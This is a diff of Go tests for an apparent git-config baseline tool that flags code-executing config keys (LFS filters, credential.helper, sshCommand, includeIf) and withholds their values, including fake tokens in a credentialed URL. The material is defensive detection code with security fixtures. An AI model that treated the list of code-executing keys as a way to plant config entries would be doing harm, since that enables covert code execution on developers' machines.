-			kd := "includeif." + urlWithheld("hasconfig:remote.*.url:https://u:"+token+"@h.example/**") + ".path"
-			return withheldLine(kd, "exec value", filepath.Join(r.root, "nonexistent.cfg"), "main checkout", r.common+"/config") +
-				"  " + kd + regexpPointer + "\n"
+			return execListing(r, last, hasconfig, filepath.Join(r.root, "nonexistent.cfg"))
 		}},
 	} {
 		t.Run(tc.name, func(t *testing.T) {
@@ -746,7 +799,7 @@ func TestRunBaselineWithholdsCredentialedValues(t *testing.T) {
 			if strings.Contains(got.stdout+got.stderr, token) {
 				t.Errorf("the token reached the screen:\n%s%s", got.stdout, got.stderr)
 			}
-			got.want(t, 1, tc.want(r), "")
+			got.want(t, 1, tc.want(r)+nextStep, "")
 		})
 	}
 }
@@ -762,12 +815,77 @@ func TestRunBaselineAcceptNotesWithheldValues(t *testing.T) {
 		t.Errorf("the token reached the screen:\n%s%s", got.stdout, got.stderr)
 	}
 	got.want(t, 1,
-		withheldLine("credential.helper", "exec value", helper, "main checkout", r.common+"/config")+
-			ownTerminalLine("credential.helper", "credential.helper")+
-			withheldNote+
-			prompt(r.baseline()),
+		execListing(r, last, "credential.helper", helper)+prompt(1, true),
 		"crew: baseline unchanged\n")
 	if after := readFile(t, r.baseline()); after != before {
 		t.Fatalf("baseline changed: %q, want %q", after, before)
+	}
+}
+
+// The layout a human reads after `git lfs install`: one header, the entries
+// aligned, one explanation, one verification command per key, one next step.
+func TestRunBaselineLayout(t *testing.T) {
+	const secret = "FAKETOKEN1468"
+	r := newRepo(t)
+	r.init(t)
+	vals := map[string]string{
+		"filter.lfs.clean":   "git-lfs clean -- %f " + secret,
+		"filter.lfs.smudge":  "git-lfs smudge -- %f",
+		"filter.lfs.process": "git-lfs filter-process",
+	}
+	for _, k := range []string{"filter.lfs.clean", "filter.lfs.smudge", "filter.lfs.process"} {
+		r.config(t, k, vals[k])
+	}
+	row := func(k string) string {
+		return "  " + k + strings.Repeat(" ", len("filter.lfs.process")-len(k)) +
+			"  can run code — value hidden  sha256:" + sha8(vals[k]) + "\n"
+	}
+	cmd := func(k string) string {
+		return "  git config -z --show-origin --get-all " + k + strings.Repeat(" ", len("filter.lfs.process")-len(k)) +
+			" | env LC_ALL=C od -An -c -v\n"
+	}
+	want := "git-config baseline: 3 new entries in " + strings.TrimSuffix(r.common, "/.git") + " (since the last baseline)\n\n" +
+		row("filter.lfs.clean") + row("filter.lfs.smudge") + row("filter.lfs.process") +
+		"  in: main checkout (.git/config)\n\n" +
+		"Hidden values stay off this screen: a planted value could carry a token or terminal escapes.\n" +
+		"See them safely (each byte prints as a character or an escape; each entry ends at \\0):\n" +
+		cmd("filter.lfs.clean") + cmd("filter.lfs.smudge") + cmd("filter.lfs.process") +
+		"  (run these from each checkout or worktree that may set them)\n" +
+		"\nIf they're yours, record them: crew git-baseline --accept\n"
+	got := runBaseline(r.main, false, "", false)
+	if got.code != 1 || got.stdout != want || got.stderr != "" {
+		t.Fatalf("exit %d, stdout:\n%s\nstderr %q\nwant stdout:\n%s", got.code, got.stdout, got.stderr, want)
+	}
+	if strings.Contains(got.stdout, secret) {
+		t.Fatalf("a withheld value reached the screen:\n%s", got.stdout)
+	}
+	if n := strings.Count(got.stdout, "Hidden values stay off"); n != 1 {
+		t.Fatalf("the explanation printed %d times", n)
+	}
+	for k := range vals {
+		if n := strings.Count(got.stdout, "--get-all "+k+" "); n != 1 {
+			t.Fatalf("%s: %d verification commands, want 1", k, n)
+		}
+	}
+
+	acc := runBaseline(r.main, true, "no\n", true)
+	wantAcc := strings.TrimSuffix(want, "\nIf they're yours, record them: crew git-baseline --accept\n") +
+		"\nRecord these 3 entries as trusted? The sha256 values should match what you checked. Type yes: "
+	if acc.code != 1 || acc.stdout != wantAcc || acc.stderr != "crew: baseline unchanged\n" {
+		t.Fatalf("exit %d, stdout:\n%s\nstderr %q\nwant stdout:\n%s", acc.code, acc.stdout, acc.stderr, wantAcc)
+	}
+}
+
+// An include path git reports with a doubled slash must not print as the
+// shorter repo-relative path, which could pass it off as another file.
+func TestRunBaselineOriginNotShortenedWhenUnclean(t *testing.T) {
+	r := newRepo(t)
+	r.init(t)
+	inc := filepath.Join(r.main, "inc.cfg")
+	writeFile(t, inc, "[core]\n\tsshCommand = x\n")
+	r.config(t, "include.path", strings.TrimSuffix(r.main, "/")+"//inc.cfg")
+	got := runBaseline(r.main, false, "", false)
+	if !strings.Contains(got.stdout, "in: main checkout ("+Quote(r.main+"//inc.cfg")+")") {
+		t.Fatalf("the unclean origin was shortened:\n%s", got.stdout)
 	}
 }
